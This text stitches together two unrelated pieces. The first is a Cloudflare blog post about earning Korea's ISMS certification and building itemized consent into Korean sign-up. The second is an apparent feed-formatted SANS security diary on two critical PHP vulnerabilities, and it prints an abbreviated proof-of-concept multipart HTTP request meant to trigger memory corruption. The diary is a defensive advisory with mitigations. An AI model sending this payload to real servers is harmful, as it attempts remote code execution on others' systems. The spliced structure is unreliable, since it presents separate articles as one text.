For ten days, auditors appointed by the Korea Internet & Security Agency (KISA) sat together with us and worked through 80 controls. That is what it took for a company headquartered in the United States, operating a global network serving Korean users, to be certified in South Korea. Cloudflare has now obtained South Korea's Information Security Management System (ISMS) certification under the ISMS-P framework.

For customers in Korea, this is more than a compliance checkbox. It is evidence that Cloudflare's security and privacy program has been examined not only for whether our controls exist, but for how they operate in the context of Korean law, the Korean language, and the particular expectations of Korean regulators.

What a Korean user sees when they sign up

The most visible result of this work is the Cloudflare account sign-up page. In most parts of the world, the line that sits above the sign-up button reads: "By continuing, I agree to Cloudflare's terms, privacy policy, and cookie policy."

A user signing up from South Korea sees something different. The Korean experience is triggered by the country selected at sign-up and by IP geolocation from within South Korea, and it breaks the same agreement into four separately labeled items, each marked required or optional, each linking to its full text, with an option to agree to all of them at once:

  • 모두 동의 (Agree to all)
  • [필수] 서비스 약관 ([Required] Terms of Service)
  • [필수] 개인정보 수집 및 이용 ([Required] Collection and use of personal information)
  • [필수] 제한된 범위의 개인정보 해외 이전 ([Required] Transfer of a limited amount of personal information overseas)
  • [선택] 제한된 범위의 개인정보 제3자 제공 ([Optional] Sharing a limited amount of personal information with marketing third parties)

The three required items are hard gates. The sign-up button stays disabled until all three are checked, so there is no path through the form that creates an account without an affirmative action on each one. The optional item governs marketing permission only, and leaving it unchecked has no effect on the account creation (it merely opts the user out of receiving marketing communications).

The hard part: sign-up paths that never show a form

Itemizing consent on a form we control is straightforward. The difficulty was the sign-up paths that skip that form entirely.

Globally, you can create a Cloudflare account with Google, Apple, or GitHub. Those flows hand the user to an identity provider and return with an authenticated identity, and they never render our own sign-up form, which is precisely where the four consent items live. There is no step in that handoff where we can present three required items, link each to its full Korean text, and require an affirmative action on each before the account exists. The identity provider's screen is not ours to change.

We could either build a separate post-authentication consent gate for one country, or remove the paths that bypass the gate we already had. We chose the second. Social sign-up is not offered in South Korea, so every account created there goes through Cloudflare’s sign-up form, which enforces the required consents.

The country signal is the same one available to any Cloudflare customer. Cloudflare derives a two-letter country code from the client IP address and exposes it on the request, as the CF-IPCountry header at the origin and as request.cf.country inside a Worker. Reduced to its essentials, the branch is a string comparison:

// Illustrative: the shape of the check, not Cloudflare's own dashboard code.
export default {
  async fetch(request) {
    // Two-letter country code derived from the client IP.
    // Same value as the CF-IPCountry request header.
    // Cloudflare's network populates this on the incoming request, so there is
    // no geolocation database, lookup service, or extra round trip of our own.
    const country = request.cf?.country;

    if (country === "KR") {
      return renderSignUp({
        locale: "ko-KR",
        consent: "itemized",  // four separate items, three of them required
        socialLogin: false,   // no path that skips the consent form
      });
    }

    return renderSignUp({ locale: "en-US", consent: "combined", socialLogin: true });
  },
};

What that does not show is why the country code is not the whole trigger. We document the limits of IP geolocation: it is an estimate rather than an exact science, addresses rotate and change ownership, and it should not be the only signal where the use case is critical to meeting the objectives of a local requirement. A Korean resident traveling abroad, or behind a VPN or a mobile carrier's NAT, may not arrive with a Korean address. So IP-based geolocation decides which form appears by default, but the country a user selects at sign-up overrides that and carries the decision from there. The IP address tells us where a request came from; only the user can tell us where they reside. Keeping those two apart is what makes the consent meaningful rather than presumed.

It is a small feature. It took a country-level product decision, and a change to the account creation path.

What ISMS is and why it matters

ISMS is a detailed, localized certification standard. It covers security policy, access control, authentication and permission management, encryption, incident response, risk management, and disaster recovery, all assessed against how personal data actually moves through an organization's systems, and against Korea's Personal Information Protection Act and its associated regulatory guidelines.

Certification requires an independent audit by an auditor appointed by KISA, a governmental institution affiliated with the Ministry of Science and ICT (MSIT), followed by review from a special committee. It is valid for three years, with an annual audit required to maintain it.

The ISMS certification is primarily established under Article 47 of Korea's Act on Promotion of Information and Communications Network Utilization and Information Protection, etc., with the certification criteria and procedure set out in its Enforcement Decree and in the public notification on ISMS certification issued by MSIT.

What the audit examined

Cloudflare is already certified against ISO/IEC 27001, ISO/IEC 27701, ISO/IEC 27017, ISO/IEC 27018 and many other globally recognized frameworks. ISMS does not replace any of them. It is a localization of the same principles, layered with Korean regulatory requirements, and that changes what auditors look for and how they look for it.

The controls in scope started with the review of data flows. We presented detailed data flow diagrams showing every path by which employees could access personal information that Cloudflare collects, processes, and stores. The flows themselves are not Korea-specific. What was different was the form the evidence had to take: the auditors were not willing to work from a narrative description of how data moves, they wanted diagrams they could read and interrogate. For each one, they examined every access control layer and tested its effectiveness, across our internal systems, our public-facing websites, event pages, and the Cloudflare dashboard, covering the full lifecycle of a user's data from first interaction through to destruction. Those diagrams are not published here due to confidentiality.

The audit also scrutinized the language and terminology of our consent collection: the exact wording at sign-up, the structure of each notification, and whether the items were presented separately and clearly. That is the kind of detail the ISMS framework is designed to surface.

Why the timeline ran to a year and a half

Part of the answer is how audit cycles work. An ISMS audit covers a single annual period, and all evidence, documentation, and systems must reflect that period. Our preparation ran past one audit year and into the next, which meant retranslating updated policies for the new audit year, re-collecting and reassessing evidence, republishing an updated privacy policy, and absorbing formatting and design changes our marketing and website teams had introduced in the meantime.

What the certificate covers

KISA defines the certified scope as a service boundary rather than as an enumerated list of in-scope products. The Statement of Scope submitted to KISA describes that boundary in three parts:

  • the organizational and operational perimeter: the Cloudflare entities, teams, and processes that operate the service;
  • the infrastructure perimeter: the network and platform the certified service runs on;
  • the information assets and personal information flows that fall inside the boundary under the ISMS control set.

If a customer-consumed Cloudflare product is delivered through that certified service boundary, meaning it runs on the same certified platform, is operated by the same certified teams, and is governed by the same ISMS, it is covered by the certificate. The certificate is held by Cloudflare, Inc.

That is a different shape from the reports most procurement teams work with. A SOC 2 report or an ISO 27001 certificate describes the system it covers and names the services included, so coverage is confirmed by finding the product in that list. The ISMS certificate carries no such list. Coverage follows the delivery path instead, whether or not a product is named anywhere.

What this means for customers

For organizations operating in Korea, this gives legal, security, and procurement teams a local assurance benchmark alongside Cloudflare's broader compliance portfolio. ISO/IEC 27001 and SOC 2 demonstrate a general security posture. ISMS reflects Korea-specific legal and regulatory expectations. That distinction matters in third-party risk reviews and in preparing for a team’s own compliance assessments.

Cloudflare’s entry can be found on KISA's public register of certified organizations, which is the independent, verifiable confirmation to cite in a risk review. Broader privacy and data protection material sits on the Cloudflare Trust Hub.

The question that usually stalls a vendor review of Cloudflare is whether a particular product in use is in scope. The certificate does not answer that by name, because it lists no products. It answers by boundary, meaning that the product is in scope if it is delivered through the certified service.

For multinational teams managing security across regions, the certification confirms that Cloudflare's program has been reviewed against local requirements in one of Asia's most important digital markets, not just designed for global scale.

Building a better Internet, for everyone

ISMS is not a harder certification than the other assurance audits we go through. It is a more nuanced one. It is built around the regulatory needs of one specific region, and it asks for genuine investment in understanding and embedding those needs, rather than mapping them onto a common control framework.

Going through it made Cloudflare more global, not less. It pushed us to think carefully about what it means to serve users in a specific local context, with local language, local consent expectations, and local data protection requirements, and to put that into how the product behaves rather than only into a document.

That is consistent with what we are working toward: helping build a better Internet for everyone, not just in the regions where regulatory requirements are straightforward, but everywhere.

To learn more about Cloudflare's compliance and assurance programs, visit our Trust Hub.

item.title: Critical PHP Vulnerability (CVE-2026-109618, CVE-2026-109619) [infocon yellow], (Wed, Oct 21st)
item.description: PHP.net announced that it will release a critical update today. We decided to change the infoCon to YELLOW due to the widespread use of PHP, the expected severity of the flaw (CVSS 9.4), and the availability of early PoC exploits before the patch became available.
item.content:encoded:
PHP.net announced that it will release a critical update today. We decided to change the infoCon to YELLOW due to the widespread use of PHP, the expected severity of the flaw (CVSS 9.4), and the availability of early PoC exploits before the patch became available. 

Various vendors have released bulletins listing products that must be patched for this vulnerability. For example:

Cisco  https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-php-october26-Jj384Daq
OPNSense https://x.com/opnsense/status/2112985458514756087
PFSense https://forum.netgate.com/topic/201565/critical-php-security-update
Palo Alto Networks https://security.paloaltonetworks.com/CVE-2026-109618
 

Many open source firewall/router products use PHP. Expect updates for them, and as always, do not expose the web admin interface to the internet.

PHP also published a summary around the release:

https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/

The PHP update was released as scheduled: https://www.php.net/index.php#2026-10-20-1

This diary will be continuously updated today. I am starting to write this diary with many details still unclear and with the patch not yet available.

Which versions of PHP are vulnerable?

The easy answer: All of them. At least starting with PHP 5, including the most recent releases.

PHP Versions 8.5.12, 8.4.27, 8.3.36, and 8.2.35, all released today, are currently the only "safe" versions. Note that Linux distributions may backport the patch for older versions.

Ubuntu just released updated PHP packages for Ubuntu 22.04, 24.04, 26.04, and  26.10. [ubuntu].

Which versions will receive patches?

Only PHP 8 is expected to receive a patch. Older versions are no longer supported. The patch is expected to be released at 14:00 UTC today, October 21st. [php] Ubuntu will release patches "as soon as possible" and may include backported patches for PHP versions included in supported Ubuntu versions.

The real "race to patch" does not start at 14:00 UTC for most people, but at the time distributions release updated packages. Most PHP sites do not use PHP compiled from php.net directly. It will almost certainly be faster to wait for your distribution to release an update.

Does this vulnerability affect specific configurations or extensions?

The vulnerability is in the PHP core, and all default PHP installations are expected to be vulnerable (see below for mitigations). 

What steps can I take to mitigate the vulnerability before applying the patch?

Early guidance suggests that the configuration setting "session.upload_progress.enabled = Off" provides partial mitigation against the vulnerability being exploited. By default, this setting is "On". Restricting the maximum allowed request size in your web server and/or PHP configuration may also help.

Are there WAF rules or other measures to protect a site running PHP?

Yes. I will add more as I verify them. Cloudflare appears to have already deployed some protections. Other vendors have likely done the same.

Have exploits been seen "in the wild"?

Cloudflare is reporting exploits [cloudflare]. PoC exploits and vulnerability details have been released [jackalsyn]

How do the vulnerabilities work?

Wiz Security published a blog post detailing how they discovered the vulnerability using AI tools. [wiz]

  • CVE-2026-109618

This vulnerability is described as a remote code execution via out-of-memory corruption. [CVE-2026-109618]. The advisory describes several issues related to this vulnerability. Firstly, a multipart MIME request without a Content-Length header may bypass the post_max_size setting, which is intended to restrict the amount of data sent in a request. As a result, more data than expected may be sent to PHP. Second, the number of headers is not restricted, allowing for additional memory use. Finally, the max_file_uploads setting is supposed to limit the number of files uploaded, but it does not consider empty files. The structures set up for empty files will also exhaust memory (this is likely where the oversized filename in the early PoC exploit below came from). 

  • CVE-2026-109619

PHP workers track global state (for example, sessions) that is associated with a specific request. Before releasing the memory associated with the request, the state must be reset. There are conditions in which the state is not properly reset, leading to a use-after-free. [CVE-2026-109619]. To trigger the vulnerability, an attacker would first have to send a request that triggers an error. For example, an "out of memory" or "request execution time exceeded" error. Secondly, a request must be sent to trigger a warning during initialization. The examples mentioned are warnings triggered by various INI settings, such as depreciation warnings. This does not apply to settings in the global php.ini file, which is only applied on startup. Instead, it applies to local configuration overrides, such as .htaccess files, that are applied to individual requests. Exploitation has been confirmed in PHP 8.5 with fatal_error_backtraces enabled. 

Related to the prior vulnerability, file upload errors can also trigger this condition and be used to exploit this vulnerability. 

What does the PoC exploit do?

The PoC exploit sends a POST request using a multipart MIME payload. These payloads are commonly seen with file uploads or other POST form submissions. According to the discussion at [jackalsyn], the trigger is in part a very large filename. The PoC exploit does not appear to be reliable, but it may provide indicators of what to look for in a working exploit.

Exploit snippet (I abbreviated the filename as it is about 5 MByte long:

POST / HTTP/1.1
Host: localhost
Cookie: PHPSESSID=s0123456789abcdefghijklmnopqrstuv
Content-Type: multipart/form-data; boundary=SctxPoc2026
Content-Length: 5244717
Connection: close

--SctxPoc2026
Content-Disposition: form-data; name="PHPSESSID"

s0123456789abcdefghijklmnopqrstuv
--SctxPoc2026
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--SctxPoc2026
Content-Disposition: form-data; name="upload0"; filename="f0-NNNNNNNNN[continues...]

NNNNNNNNNNNN"

Z
--SctxPoc2026--

(Again, this is the unreliable/incomplete exploit PoC published by [jackalsyn].)

Anything else I may want to do?

Again, the only real fix is the patch, but in a pinch, some other filters and adding some "obscurity" may help:

  • Block all requests with "Content-Type: multipart/form-data". This, of course, will break file uploads.
  • Hide the fact that you are using PHP. Now we are talking real weak "security through obscurity", but it may help with some early exploits. This involves using extensions other than .php, and setting expose_php=Off in your PHP configuration to get started. You may also want to review the PHP session cookie name.

[cloudflare] https://x.com/IntCyberDigest/status/2112845843938054610/photo/1
[jackalsyn] https://jackalsyn.com/posts/php-up-2026.html
[php] https://www.php.net/archive/2026.php#2026-10-20-1
[CVE-2026-109618] https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w
[CVE-2026-109619] https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp
[ubuntu] https://ubuntu.com/security/notices/USN-8948-1
[wiz] https://www.wiz.io/blog/php2shell-php-rce

--
Johannes B. Ullrich, Ph.D. , Dean of Research, SANS.edu
Twitter|
